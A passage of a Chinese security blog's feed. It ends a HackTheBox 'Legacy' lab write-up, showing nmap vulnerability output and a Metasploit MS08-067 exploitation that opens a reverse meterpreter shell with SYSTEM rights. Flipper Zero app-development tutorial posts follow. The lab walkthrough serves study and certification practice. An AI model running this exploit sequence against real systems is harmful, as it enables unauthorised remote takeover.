execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.00 seconds</span><br></pre></td></tr></table></figure></div>超蠢結果機器重開就有了：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfconsole</span><br><span class="line">Metasploit tip: Use the edit <span class="built_in">command</span> to open the currently active module </span><br><span class="line"><span class="keyword">in</span> your editor</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2008-4250</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                 Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                 ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 0</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> rhost 10.129.227.181</span><br><span class="line">rhost =&gt; 10.129.227.181</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.227.181:445 - Automatically detecting the target...</span><br><span class="line">[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English</span><br><span class="line">[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.227.181</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.227.181:1039) at 2024-10-27 05:55:37 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; <span class="built_in">id</span> </span><br><span class="line">[-] Unknown <span class="built_in">command</span>: <span class="built_in">id</span></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/legacy_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;從今天開始想要在考 OSCP 前刷一下 HackTheBox 中跟 OSCP 證照比較相關的機器：&lt;br&gt;&lt;a class=&quot;link&quot;   href=&quot;https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation&quot; &gt;</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day30 - 未完待續！撲朔迷離的十一月預告信？</title>
    <link href="https://kazma.tw/2024/10/14/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day30/"/>
    <id>https://kazma.tw/2024/10/14/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day30/</id>
    <published>2024-10-14T07:13:51.887Z</published>
    <updated>2024-10-29T03:22:04.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="健身海豚教練"><a href="#健身海豚教練" class="headerlink" title="健身海豚教練"></a>健身海豚教練</h2><p>估計是做不完了XD<br>所以簡單說一下之後預計要怎麼完成：<br>首先是功能的部分，我希望可以透過事前輸入課表，包括次數、組數、組間休息時間、然後每次去健身的時候就可以開始課表，然後他會告訴我現在要做的動作名稱，次數和組數，然後我做完之後按下 Finish 就可以開始倒數組間休，時間倒數完就會跳一個 popup 五秒後消失，叫我們趕快做下一組然後做完再按 Finish 如此重複。<br>然後可以儲存不同的課表，之後我們可以從已儲存的列表選擇今天要訓練的項目。</p><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>終於到了挑戰的最後一天，來講一些關於挑戰的心得。<br>很感謝這個挑戰讓我可以養成每天學習一個新技術的習慣，基本上每天都是到了晚上 21. 就開始要準備撰寫當天的文章，然後幾乎都在截止前十分鐘送出，取名字的部分也是花了點心思，因為本身覺得取名字是一門藝術。最後確實也發掘了不少有趣的 Flipper Zero 功能，雖然自己預期能夠寫出更有技術深度的文章，甚至最後一天預計是要完整開發一個應用程式的，但這個月的行程真的是太爆炸緊湊了。<br>這個挑戰結束後，也預計每天花固定的時間進行同一個研究或是閱讀手邊的書籍，希望明天可以跟牛肉湯的夥伴們組隊拿下一些獎項。</p><h2 id="預告信"><a href="#預告信" class="headerlink" title="預告信"></a>預告信</h2><p>今年十一月份的時候，你們還會回到這裡來的～<br>我們到時候見！<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/letter.png"                      alt="letter"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;健身海豚教練&quot;&gt;&lt;a href=&quot;#健身海豚教練&quot; class=&quot;headerlink&quot; title=&quot;健身海豚教練&quot;&gt;&lt;/a&gt;健身海豚教練&lt;/h2&gt;&lt;p&gt;估計是做不完了XD&lt;br&gt;所以簡單說一下之後預計要怎麼完成：&lt;br&gt;首先是功能的部分，我希望可以透過事前輸入</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day29 - 絶対的な優位を掌握せよ！倒数24時間、登場する圧軸必殺技！</title>
    <link href="https://kazma.tw/2024/10/13/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day29/"/>
    <id>https://kazma.tw/2024/10/13/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day29/</id>
    <published>2024-10-13T10:49:19.296Z</published>
    <updated>2024-10-27T09:35:25.861Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/popup_demo.png"                      alt="popup_demo"                ><br>圖片來源：<a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-02/" >https://instantiator.dev/post/flipper-zero-app-tutorial-02/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="定義場景功能的核心步驟"><a href="#定義場景功能的核心步驟" class="headerlink" title="定義場景功能的核心步驟"></a>定義場景功能的核心步驟</h2><p>當我們在開發 Flipper Zero 應用程式時，每個場景都有三個關鍵函式，這些函式主要是負責管理進入場景時的資源、處理事件以及離開場景時釋放資源，如下：</p><ol><li>**<code>*_on_enter</code>**：當進入場景時初始化視圖及資源。</li><li>**<code>*_on_event</code>**：處理使用者輸入和自定義事件。</li><li>**<code>*_on_exit</code>**：離開場景時，釋放佔用的資源。</li></ol><h3 id="設定主選單的回傳函式"><a href="#設定主選單的回傳函式" class="headerlink" title="設定主選單的回傳函式"></a>設定主選單的回傳函式</h3><p>在主選單的場景中，我們會定義一個回傳函式 <code>test_app_menu_callback_main_menu</code>。這個回傳函式會接收到使用者的選擇，這個選擇值來自於 <code>TestAppMenuSelection</code>。透過這個值，我們可以確認使用者選擇了哪一個選項，並將此選擇發送到場景管理器的自定義事件處理函式。這樣做的好處是將事件傳遞給場景管理器，而不是在選單回傳函式中處理事件，能夠確保每個場景都能處理自己的邏輯，提升整體的可讀性和維護性。</p><h3 id="進入主選單場景"><a href="#進入主選單場景" class="headerlink" title="進入主選單場景"></a>進入主選單場景</h3><p>當我們進入主選單場景時，會調用 <code>test_app_scene_on_enter_main_menu</code> 函式來設定場景。這裡的工作是初始化該場景所需要的資源，並指示視圖調度器切換到對應的視圖。步驟如下：</p><ol><li><p><strong>重設選單視圖</strong>：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menu_reset(app-&gt;menu);</span><br></pre></td></tr></table></figure></div><p>這行程式碼會重置選單，確保我們開始時的選單是乾淨的，不包含任何之前添加的項目。</p></li><li><p><strong>添加選單項目</strong>：<br>每個選單項目都會用來表示一個選擇，並且會指派一個來自 <code>TestAppMenuSelection</code> 的 ID。這個 ID 在選單回呼函式中用來確認使用者做出的選擇。例如：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">menu_add_item(</span><br><span class="line">    app-&gt;menu,</span><br><span class="line">    <span class="string">&quot;First popup&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    TestAppMenuSelection_One,</span><br><span class="line">    test_app_menu_callback_main_menu,</span><br><span class="line">    app);</span><br></pre></td></tr></table></figure></div><p>在這裡，我們為選單添加了一個名為「First popup」的選項，並指定當使用者選擇這個項目時會調用 <code>test_app_menu_callback_main_menu</code>，並且將選擇項目標識（<code>TestAppMenuSelection_One</code>）傳給這個回呼函式。</p></li><li><p><strong>切換到選單視圖</strong>：<br>最後一步是指示視圖調度器切換到選單視圖，讓使用者能夠看到並進行選擇：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view_dispatcher_switch_to_view(app-&gt;view_dispatcher, TestAppView_Menu);</span><br></pre></td></tr></table></figure></div></li></ol><p>到目前為止，我們的選單場景已經成功設定好並且可以開始與使用者互動了。透過這種方式，場景管理器可以輕鬆處理每個場景的進入、退出以及事件處理，而且具有乾淨、高擴展性的應用程式架構。</p><h2 id="處理場景中的事件"><a href="#處理場景中的事件" class="headerlink" title="處理場景中的事件"></a>處理場景中的事件</h2><p>當進入選單場景時，我們會遇到不同類型的事件。這些事件主要包括自定義事件、返回事件、以及時間流逝（Tick）事件。我們通過事件處理函式來處理這些事件。</p><h3 id="事件類型"><a href="#事件類型" class="headerlink" title="事件類型"></a>事件類型</h3><p>事件類型被定義為 <code>SceneManagerEventType</code>，具有三個主要值：</p><ol><li><strong>SceneManagerEventTypeCustom</strong>：這是自定義事件，用來表示像是使用者的互動或輸入等事件。</li><li><strong>SceneManagerEventTypeBack</strong>：這個事件表示使用者正試圖返回應用程式的上一個場景。如果沒有特別處理，場景管理器會自動將使用者帶回到上一個場景。</li><li><strong>SceneManagerEventTypeTick</strong>：這個事件表示時間流逝，場景應該刷新並有機會更新任何隨著時間推移而改變的數據模型。</li></ol><h3 id="處理自定義事件"><a href="#處理自定義事件" class="headerlink" title="處理自定義事件"></a>處理自定義事件</h3><p>當使用者在選單中選擇某個選項時，<code>test_app_menu_callback_main_menu</code> 會創建 <code>SceneManagerEventTypeCustom</code> 類型的事件，並通過 <code>scene_manager_handle_custom_event</code> 發送給場景管理器。這樣的事件會被傳遞到場景管理器的 <code>_on_event</code> 函式，進行處理。</p><p>這些事件包含來自 <code>TestAppEvent</code> 的值，例如 <code>TestAppEvent_ShowPopupOne</code> 或 <code>TestAppEvent_ShowPopupTwo</code>。處理邏輯如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> consumed = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">switch</span>(event.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> SceneManagerEventTypeCustom:</span><br><span class="line">        <span class="keyword">switch</span>(event.event) &#123;</span><br><span class="line">            <span class="keyword">case</span> TestAppEvent_ShowPopupOne:</span><br><span class="line">                scene_manager_next_scene(app-&gt;scene_manager, TestAppScene_FirstPopup);</span><br><span class="line">                consumed = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TestAppEvent_ShowPopupTwo:</span><br><span class="line">                scene_manager_next_scene(app-&gt;scene_manager, TestAppScene_SecondPopup);</span><br><span class="line">                consumed = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        consumed = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> consumed;</span><br></pre></td></tr></table></figure></div><p>這段程式碼會根據不同的事件進行場景切換，例如當使用者選擇了第一個彈出視窗，則切換到 <code>TestAppScene_FirstPopup</code> 場景。</p><h3 id="清理場景資源"><a href="#清理場景資源" class="headerlink" title="清理場景資源"></a>清理場景資源</h3><p>當離開選單場景時，我們會調用 <code>test_app_scene_on_exit_main_menu</code>，用來清理場景的資源：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TestApp* app = context;</span><br><span class="line">menu_reset(app-&gt;menu);</span><br></pre></td></tr></table></figure></div><p>雖然在進入場景時我們也重設了選單，但在離開時再次清理資源是一個比較好的習慣，這樣可以確保場景中的資源不會長期佔用記憶體。</p><h2 id="設定彈出視窗場景"><a href="#設定彈出視窗場景" class="headerlink" title="設定彈出視窗場景"></a>設定彈出視窗場景</h2><p>與選單場景相比，彈出視窗場景的邏輯相對簡單。每個彈出視窗的主要邏輯集中在 <code>*_on_enter</code> 函式中，用來初始化視窗和設置其內容。例如，以下程式碼設置了一個彈出視窗：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">popup_reset(app-&gt;popup);</span><br><span class="line">popup_set_context(app-&gt;popup, app);</span><br><span class="line">popup_set_header(app-&gt;popup, <span class="string">&quot;Popup One&quot;</span>, <span class="number">64</span>, <span class="number">10</span>, AlignCenter, AlignTop);</span><br><span class="line">popup_set_icon(app-&gt;popup, <span class="number">10</span>, <span class="number">10</span>, &amp;I_cvc_36x36);</span><br><span class="line">popup_set_text(app-&gt;popup, <span class="string">&quot;One! One popup. Ah ah ah...&quot;</span>, <span class="number">64</span>, <span class="number">20</span>, AlignLeft, AlignTop);</span><br><span class="line">view_dispatcher_switch_to_view(app-&gt;view_dispatcher, TestAppView_Popup);</span><br></pre></td></tr></table></figure></div><p>在這裡，我們透過 <code>popup_set_header</code> 和 <code>popup_set_text</code> 設置彈出視窗的標題和內容，最後使用 <code>view_dispatcher_switch_to_view</code> 切換到彈出視窗視圖。</p><h3 id="清理彈出視窗"><a href="#清理彈出視窗" class="headerlink" title="清理彈出視窗"></a>清理彈出視窗</h3><p>當離開彈出視窗場景時，我們會調用 <code>popup_reset</code> 來清理視窗的內容，確保不再佔用記憶體。</p><h2 id="圖片資源管理"><a href="#圖片資源管理" class="headerlink" title="圖片資源管理"></a>圖片資源管理</h2><p>在程式碼中的幾個地方，我們可以看到以 <code>I_</code> 為前綴的 Icon 指標。這些指標是由 ufbt 在編譯過程中自動從 <code>images/</code> 資料夾中的資源創建出來的。</p><p>例如，在資料夾中有幾個圖像檔案：</p><ul><li><code>cvc_36x36.png</code>：這是一個 Count von Count 的小圖像，編譯後變為 <code>I_cvc_36x46</code>。</li><li><code>one.png</code>：10x10 尺寸的圖示，代表羅馬數字「i」，編譯後變為 <code>I_one</code>。</li><li><code>two.png</code>：10x10 尺寸的圖示，代表羅馬數字「ii」，編譯後變為 <code>I_two</code>。</li></ul><p>我們可以通過將更多的 1-bit PNG 檔案添加到該資料夾中，讓它們在編譯過程中被整合進應用程式，並在程式碼中以 Icon 資源的形式使用。</p><h2 id="編譯與部署"><a href="#編譯與部署" class="headerlink" title="編譯與部署"></a>編譯與部署</h2><p>首先，取得我們這邊用 instantiator.dev 在這篇部落格示範的專案示範：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/instantiator/flipper-zero-tutorial-app.git</span><br></pre></td></tr></table></figure></div><p>接著，可以開始編譯應用程式：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ufbt</span><br><span class="line">scons: Entering directory `/Users/lewiswestbury/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        CC      /Users/lewiswestbury/src/personal/test_app/test_app.c</span></span><br><span class="line"><span class="string">        CDB     /Users/lewiswestbury/src/personal/test_app/.vscode/compile_commands.json</span></span><br><span class="line"><span class="string">        LINK    /Users/lewiswestbury/.ufbt/build/test_app_d.elf</span></span><br><span class="line"><span class="string">        INSTALL /Users/lewiswestbury/src/personal/test_app/dist/debug/test_app_d.elf</span></span><br><span class="line"><span class="string">        APPMETA /Users/lewiswestbury/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">        FAP     /Users/lewiswestbury/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">        INSTALL /Users/lewiswestbury/src/personal/test_app/dist/test_app.fap</span></span><br><span class="line"><span class="string">        APPCHK  /Users/lewiswestbury/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">                Target: 7, API: 26.0</span></span><br></pre></td></tr></table></figure></div><p>如果我們的 ufbt 工具與 Flipper 設備上的韌體版本一致，就可以將它直接部署到 Flipper 上：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ufbt launch</span><br><span class="line">scons: Entering directory `/Users/lewiswestbury/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">python3 &quot;/Users/lewiswestbury/.ufbt/current/scripts/runfap.py&quot; -s /Users/lewiswestbury/.ufbt/build/test_app.fap -t /ext/apps/Examples/test_app.fap</span></span><br><span class="line"><span class="string">        APPCHK  /Users/lewiswestbury/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">                Target: 7, API: 26.0</span></span><br><span class="line"><span class="string">2023-05-06 23:38:36,824 [INFO] Using flip_Akurisau on /dev/cu.usbmodemflip_Akurisau1</span></span><br><span class="line"><span class="string">2023-05-06 23:38:36,877 [INFO] Installing &quot;/Users/lewiswestbury/.ufbt/build/test_app.fap&quot; to /ext/apps/Examples/test_app.fap</span></span><br><span class="line"><span class="string">2023-05-06 23:38:36,916 [INFO] Sending &quot;/Users/lewiswestbury/.ufbt/build/test_app.fap&quot; to &quot;/ext/apps/Examples/test_app.fap&quot;</span></span><br><span class="line"><span class="string">100%, chunk 1 of 1</span></span><br><span class="line"><span class="string">2023-05-06 23:38:37,108 [INFO] Launching app: &quot;Applications&quot; /ext/apps/Examples/test_app.fap</span></span><br></pre></td></tr></table></figure></div><p>如果韌體版本與 ufbt 工具不一致，Flipper 會告訴我們。此時可以透過以下指令更新開發工具的 SDK：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufbt update --channel=[dev|rc|release]</span><br></pre></td></tr></table></figure></div><p>或者可以使用 qFlipper 來更新 Flipper 的韌體，或者使用以下指令進行 USB 刷入：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufbt flash_usb</span><br></pre></td></tr></table></figure></div><p>如果使用的是 ST-link，也可以使用以下指令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufbt flash</span><br></pre></td></tr></table></figure></div><h2 id="整合所有部分"><a href="#整合所有部分" class="headerlink" title="整合所有部分"></a>整合所有部分</h2><p>通過本次的教學，我們已經介紹了如何為 Flipper Zero 應用程式初始化與啟動簡單的使用者介面。</p><p>作者提供完整的教學程式碼可以在文章最後的 References 找到，他鼓勵大家可以自由使用該專案的程式碼進行學習與修改。也建議各位去看看他的教學，並參考其他教學資源，進一步加深對 Flipper Zero 介面開發的了解。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>instantiator.dev 的教學我們已經完成了，明天我們會把健身海豚教練開發完成，並結束今年的鐵人賽挑戰！<br>各位期待明天最後一篇吧！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-02/" >https://instantiator.dev/post/flipper-zero-app-tutorial-02/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://github.com/instantiator/flipper-zero-tutorial-app" >https://github.com/instantiator/flipper-zero-tutorial-app <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cover&quot;&gt;&lt;a href=&quot;#Cover&quot; class=&quot;headerlink&quot; title=&quot;Cover&quot;&gt;&lt;/a&gt;Cover&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day28 - 會寫完喔！倒數 48 小時的勝利宣言，即將踏上終點的鐵人賽之旅！</title>
    <link href="https://kazma.tw/2024/10/12/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day28/"/>
    <id>https://kazma.tw/2024/10/12/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day28/</id>
    <published>2024-10-12T13:17:31.017Z</published>
    <updated>2024-10-27T09:34:56.609Z</updated>
    
